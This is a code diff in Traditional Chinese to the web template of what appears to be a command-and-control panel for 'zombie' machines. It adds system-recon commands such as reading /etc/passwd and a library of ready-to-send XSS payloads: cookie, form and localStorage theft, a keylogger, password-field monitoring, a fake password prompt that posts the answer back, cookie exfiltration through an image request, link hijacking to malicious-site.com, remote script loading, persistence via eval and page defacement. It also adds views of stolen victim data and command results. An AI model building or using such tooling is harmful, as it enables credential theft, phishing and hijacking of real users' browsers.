@@ -77,7 +77,84 @@
                         <button type="button" class="quick-cmd-btn" onclick="setCommand('ps aux')">ps aux</button>
                         <button type="button" class="quick-cmd-btn"
                             onclick="setCommand('netstat -tuln')">netstat</button>
+                        <button type="button" class="quick-cmd-btn" onclick="setCommand('uname -a')">uname -a</button>
+                        <button type="button" class="quick-cmd-btn" onclick="setCommand('df -h')">df -h</button>
+                        <button type="button" class="quick-cmd-btn"
+                            onclick="setCommand('cat /etc/passwd')">查看用戶</button>
+                        <button type="button" class="quick-cmd-btn"></button>
                     </div>
+                </div>
+                <label class="form-label">XSS載荷</label>
+                <div class="xss-payload">
+                    <!-- 基礎 XSS 載荷 -->
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('(function(){ return document.cookie || &quot;無Cookie&quot;; })()')">查看Cookie</button>
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('(function(){ var links = []; document.querySelectorAll(&quot;a&quot;).forEach(function(a){ links.push({text: a.innerText, href: a.href, target: a.target}); }); return JSON.stringify(links, null, 2); })()')">查看所有連結</button>
+
+                    <!-- 信息收集類 XSS -->
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('(function(){ var info = { title: document.title, url: window.location.href, userAgent: navigator.userAgent, referrer: document.referrer, domain: document.domain }; return JSON.stringify(info, null, 2); })()')">基本信息收集</button>
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('(function(){ var forms = []; document.querySelectorAll(&quot;form&quot;).forEach(function(f, i){ forms.push({ index: i+1, action: f.action, method: f.method, inputs: Array.from(f.querySelectorAll(&quot;input&quot;)).map(inp => ({name: inp.name, type: inp.type, value: inp.value})) }); }); return JSON.stringify(forms, null, 2); })()')">查看所有表單</button>
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('(function(){ var inputs = []; document.querySelectorAll(&quot;input&quot;).forEach(function(inp){ inputs.push({name: inp.name, type: inp.type, value: inp.value, placeholder: inp.placeholder}); }); return JSON.stringify(inputs, null, 2); })()')">查看表單輸入值</button>
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('(function(){ return JSON.stringify({ localStorage: Object.keys(localStorage).reduce((obj, key) => { obj[key] = localStorage[key]; return obj; }, {}), sessionStorage: Object.keys(sessionStorage).reduce((obj, key) => { obj[key] = sessionStorage[key]; return obj; }, {}) }, null, 2); })()')">查看本地存儲</button>
+
+                    <!-- 鍵盤記錄類 XSS -->
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('var keys = []; document.addEventListener(\'keypress\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\'按鍵記錄: \' + keys.join(\'\')); keys = []; } });')">啟動按鍵記錄</button>
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('document.querySelectorAll(\'input[type=password]\').forEach(function(pwd){ pwd.addEventListener(\'input\', function(){ console.log(\'密碼輸入: \' + pwd.value); }); });')">密碼欄位監控</button>
+
+                    <!-- 頁面操作類 XSS -->
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('document.body.style.transform = \'rotate(180deg)\'; setTimeout(function(){ document.body.style.transform = \'rotate(0deg)\'; }, 3000);')">翻轉頁面3秒</button>
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('document.body.innerHTML = \'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\';')">替換頁面內容</button>
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('setInterval(function(){ document.body.style.backgroundColor = [\'red\',\'blue\',\'green\',\'yellow\'][Math.floor(Math.random()*4)]; }, 500);')">閃爍背景色</button>
+
+                    <!-- 網路請求類 XSS -->
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('fetch(\'/api/control/add_message\', { method: \'POST\', body: new URLSearchParams({message: \'XSS測試成功 - 來自: \' + window.location.href, target_ip: window.location.hostname}) });')">發送測試消息</button>
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('var img = new Image(); img.src = \'http://127.0.0.1:8964/api/control/add_message?message=\' + encodeURIComponent(\'XSS via Image - Cookie: \' + document.cookie) + \'&target_ip=\' + window.location.hostname;')">通過圖片發送Cookie</button>
+
+                    <!-- 瀏覽器指紋收集 -->
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('(function(){ var fingerprint = { screen: screen.width + &quot;x&quot; + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()')">瀏覽器指紋</button>
+
+                    <!-- 社交工程類 XSS -->
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('var userInput = prompt(\'系統安全檢查：請輸入您的密碼以繼續\'); if(userInput) { fetch(\'/api/control/add_message\', { method: \'POST\', body: new URLSearchParams({message: \'釣魚成功 - 密碼: \' + userInput, target_ip: window.location.hostname}) }); }')">密碼釣魚</button>
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('if(confirm(\'檢測到安全威脅！是否要下載安全補丁？\')) { alert(\'用戶同意下載，可以進行下一步攻擊\'); }')">安全威脅詐騙</button>
+
+                    <!-- 持久性 XSS -->
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('localStorage.setItem(\'xss_payload\', \'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\'); eval(localStorage.getItem(\'xss_payload\'));')">本地存儲持久化</button>
+
+                    <!-- DOM 操作類 XSS -->
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('var maliciousDiv = document.createElement(\'div\'); maliciousDiv.innerHTML = \'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\'; document.body.appendChild(maliciousDiv);')">偽造錯誤覆蓋層</button>
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('document.querySelectorAll(\'a\').forEach(function(link){ if(link.href.includes(\'http\')) { link.href = \'http://malicious-site.com/redirect?original=\' + encodeURIComponent(link.href); } });')">劫持所有外部連結</button>
+
+                    <!-- 高級載荷 -->
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('(function(){ var script = document.createElement(&quot;script&quot;); script.src = &quot;http://127.0.0.1:8964/api/control/xss_payload&quot;; document.head.appendChild(script); return &quot;遠程腳本載入中...&quot;; })()')">載入遠程腳本</button>
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('(function(){ return document.documentElement.outerHTML.substring(0, 2000); })()')">竊取頁面HTML</button>
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('(function(){ var scripts = []; document.querySelectorAll(&quot;script&quot;).forEach(function(s){ scripts.push({src: s.src, content: s.innerHTML.substring(0, 200)}); }); return JSON.stringify(scripts, null, 2); })()')">查看頁面腳本</button>
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('(function(){ var meta = []; document.querySelectorAll(&quot;meta&quot;).forEach(function(m){ meta.push({name: m.name, content: m.content, property: m.property}); }); return JSON.stringify(meta, null, 2); })()')">查看Meta信息</button>
+
+                    <!-- 測試載荷 -->
+                    <button type="button" class="quick-cmd-btn"
+                        onclick="setCommand('(function(){ var result = { timestamp: new Date().toISOString(), url: window.location.href, title: document.title, userAgent: navigator.userAgent, cookies: document.cookie, domElements: document.querySelectorAll(&quot;*&quot;).length }; return &quot;=== 完整信息收集結果 ===\\n&quot; + JSON.stringify(result, null, 2); })()')">完整信息收集</button>
                 </div>
                 <button type="submit">💀 發送命令</button>
                 <button type="button" onclick="hideCommandForm()">取消</button>
@@ -157,6 +234,9 @@
                             <div class="zombie-actions">
                                 <button class="action-btn" onclick="event.stopPropagation(); selectZombie('${zombie}')">
                                     💀 發送命令
+                                </button>
+                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults('${zombie}')">
+                                    📋 查看結果
                                 </button>
                             </div>
                         </div>
@@ -240,6 +320,154 @@
             showTab('zombies');
         }
     });
+
+    // 新增：顯示殭屍機器的執行結果
+    async function showZombieResults(zombieIp) {
+        try {
+            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);
+            const data = await response.json();
+
+            if (data.status === 'success') {
+                // 創建彈出視窗顯示結果
+                const modal = createResultModal(data);
+                document.body.appendChild(modal);
+                modal.style.display = 'block';
+            } else {
+                alert(`無法獲取結果: ${data.error}`);
+            }
+        } catch (error) {
+            console.error('獲取結果失敗:', error);
+            alert('獲取結果時發生網路錯誤');
+        }
+    }
+
+    // 創建結果顯示彈出視窗
+    function createResultModal(zombieData) {
+        const modal = document.createElement('div');
+        modal.className = 'result-modal';
+        modal.innerHTML = `
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>
+                    <button class="close-modal" onclick="closeModal(this)">&times;</button>
+                </div>
+                <div class="modal-body">
+                    <!-- 註冊信息 -->
+                    <div class="info-section">
+                        <h4>📝 註冊信息</h4>
+                        <div class="info-content">
+                            ${formatRegistrationInfo(zombieData.registration_info)}
+                        </div>
+                    </div>
+
+                    <!-- 當前命令 -->
+                    <div class="info-section">
+                        <h4>⚡ 當前待執行命令</h4>
+                        <div class="info-content">
+                            <code>${zombieData.current_command || '無待執行命令'}</code>
+                        </div>
+                    </div>
+
+                    <!-- 執行結果 -->
+                    <div class="info-section">
+                        <h4>📊 命令執行結果</h4>
+                        <div class="results-container">
+                            ${formatExecutionResults(zombieData.execution_results)}
+                        </div>
+                    </div>
+
+                    <!-- 時間信息 -->
+                    <div class="info-section">
+                        <h4>🕒 時間信息</h4>
+                        <div class="info-content">
+                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>
+                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+        return modal;
+    }
+
+    // 格式化註冊信息
+    function formatRegistrationInfo(regInfo) {
+        if (!regInfo || Object.keys(regInfo).length === 0) {
+            return '<p>無註冊信息</p>';
+        }
+
+        let html = '<div class="reg-info">';
+        for (const [key, value] of Object.entries(regInfo)) {
+            const displayKey = {
+                'where': '來源頁面',
+                'hostname': '主機名稱',
+                'cookie': 'Cookie',
+                'user_agent': '用戶代理',
+                'time_stamp': '時間戳記'
+            }[key] || key;
+
+            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;
+        }
+        html += '</div>';
+        return html;
+    }
+
+    // 格式化執行結果
+    function formatExecutionResults(results) {
+        if (!results || results.length === 0) {
+            return '<div class="no-results">尚無執行結果</div>';
+        }
+
+        let html = '';
+        results.forEach((result, index) => {
+            const statusIcon = result.success ? '✅' : '❌';
+            const statusText = result.success ? '成功' : '失敗';
+
+            html += `
+                <div class="result-item ${result.success ? 'success' : 'error'}">
+                    <div class="result-header">
+                        <span class="result-status">${statusIcon} ${statusText}</span>
+                        <span class="result-time">${formatDateTime(result.timestamp)}</span>
+                    </div>
+                    <div class="result-command">
+                        <strong>命令:</strong> <code>${result.command || '未知命令'}</code>
+                    </div>
+                    ${result.output ? `
+                        <div class="result-output">
+                            <strong>輸出:</strong>
+                            <pre>${result.output}</pre>
+                        </div>
+                    ` : ''}
+                    ${result.error ? `
+                        <div class="result-error">
+                            <strong>錯誤:</strong>
+                            <pre>${result.error}</pre>
+                        </div>
+                    ` : ''}
+                </div>
+            `;
+        });
+
+        return html;
+    }
+
+    // 格式化日期時間
+    function formatDateTime(dateStr) {
+        if (!dateStr) return '未知';
+        try {
+            return new Date(dateStr).toLocaleString('zh-TW');
+        } catch {
+            return dateStr;
+        }
+    }
+
+    // 關閉彈出視窗
+    function closeModal(button) {
+        const modal = button.closest('.result-modal');
+        if (modal) {
+            modal.remove();
+        }
+    }
 </script>
 
 {% endblock %}
